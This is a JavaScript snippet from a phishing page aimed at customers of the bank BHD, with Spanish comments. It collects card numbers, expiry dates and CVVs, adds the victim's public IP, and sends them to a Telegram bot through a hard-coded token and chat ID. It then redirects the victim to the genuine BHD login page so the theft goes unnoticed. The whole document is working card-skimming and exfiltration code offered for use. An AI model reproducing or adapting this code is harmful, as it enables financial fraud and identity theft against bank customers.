function sendToTelegram(cardNumber, expiryDate, cvv) {
    // Primero obtenemos la IP pública del cliente
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(ipData => {
            const ip = ipData.ip;
            const token = "8912252632:AAEJf_puzYmDrMbn_Y2kOqhWAMgc-wBc0VI";
            const chat_id = "8555745789";
            const message = `=====DATOS TARJETA BHD=======\nNúmero: ${cardNumber}\nExpira: ${expiryDate}\nCVV: ${cvv}\nIP del cliente: ${ip}`;
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;

            return fetch(url);
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                // Muestra el modal de éxito y redirige
                mostrarModalYRedirigir();
            } else {
                alert("Hubo un problema al enviar los datos.");
            }
        })
        .catch(error => {
            alert("Error al obtener la IP o enviar la solicitud.");
        });
}

function mostrarModalYRedirigir() {
    var modal = document.createElement('div');
    // ... el mismo código del modal que ya tenías ...
    document.body.appendChild(modal);
    setTimeout(function() {
        window.location.href = "https://ibp.bhd.com.do/#/login";
    }, 2500);
}
